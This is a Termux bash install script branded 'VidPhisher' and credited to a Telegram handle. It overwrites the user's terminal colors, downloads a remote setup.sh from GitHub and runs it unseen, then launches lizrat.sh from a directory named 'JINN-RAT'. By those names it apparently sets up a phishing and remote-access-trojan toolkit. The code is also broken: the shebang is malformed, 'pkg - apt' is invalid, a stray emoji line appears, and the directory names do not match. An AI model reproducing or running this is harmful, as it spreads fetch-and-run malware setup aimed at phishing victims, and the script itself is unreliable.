#!data/data/com.termux/files/usr/bin/bash

# Colors
clear='\033[0m'
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
Yellow='\033[0;33m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
Black="\033[1;30m"
Violate="\033[1;37m"
Nc="\033[00m"

version="1.0"

# Logo
logo="
${Green}__     ___     _ ____  _     _     _ 
${Red}\ \   / (_) __| |  _ \| |__ (_)___| |__   ___ _ __ 
${Cyan} \ \ / /| |/ _' | |_) | '_ \| / __| '_ \ / _ \ '__| 
${Purple}  \ V / | | (_| |  __/| | | | \__ \ | | |  __/ | 
${Yellow}   \_/  |_|\__,_|_|   |_| |_|_|___/_| |_|\___|_| 
${Red}   Telegram : @MrJinnTelegram                [v${version}] 
${Blue}  YouTube : https://bit.ly/3pSnvho         [By alvinbaby] 

${Green}[ ${Yellow}@MrJinnTelegram${clear} ${Green}]${clear}
"

echo "Please wait..."

cd $HOME
cd .termux
cp colors.properties ../;rm colors.properties
wget https://raw.githubusercontent.com/alvinbaby/Terminal-In-Termux/main/alvinbaby/colors.properties

cd $HOME

echo
sleep 3
pkg - apt update -y;pkg - apt upgrade -y
echo
echo -e "[${Yellow}+${clear}] Termux updated..."
echo -e "[${Yellow}+${clear}] Please wait..."
sleep 3

mkdir lizrat
apt-get install ruby

cd $HOME
wget https://github.com/busyloop/lolcat/archive/master.zip
unzip master.zip
cd lolcat-master/bin
gem install lolcat

cd $HOME
wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh
bash setup.sh

clear |✅✅✅

cd JINN-RAT
chmod +x lizrat.sh
bash lizrat.sh
